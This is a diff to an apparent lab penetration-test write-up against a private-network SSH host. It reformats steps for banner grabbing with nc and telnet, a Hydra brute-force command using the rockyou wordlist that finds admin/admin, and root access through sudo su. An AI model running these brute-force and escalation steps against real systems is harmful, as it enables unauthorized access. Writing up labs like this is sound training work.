@@ -27,9 +27,10 @@ No immediate remote exploit is available, but weak password authentication can b
 #4. Enumeration
 
 **4.1 Banner Grabbing**
-Command:
+```
 nc 192.168.1.101 22
-
+telnet 192.168.1.101 22
+```
 Result:
 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
 
@@ -52,12 +53,12 @@ Gathered from:
 It will so the Cryptographic info 
 # 5. Exploitation
 
-**5.1 Brute-Force Attack (Hydra)**
+**5.1 Brute-Force Attack [Hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/)**
 
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
 ```
-
+Commands : -l/L  known/unknown with user-list , -p/P known/unknown with pass-list
 Result:
 [22][ssh] host: 192.168.1.101   login: admin   password: admin
 
@@ -69,9 +70,9 @@ Result:
 - Successful login
 - User shell obtained
 
-Privilege Escalation:
+**Privilege Escalation**
 - Tried `sudo -l`
-- Password for `msfadmin` is same as username
+- Password for `admin` is same as username
 - Escalated to root using `sudo su`
 
 6. Post-Exploitation
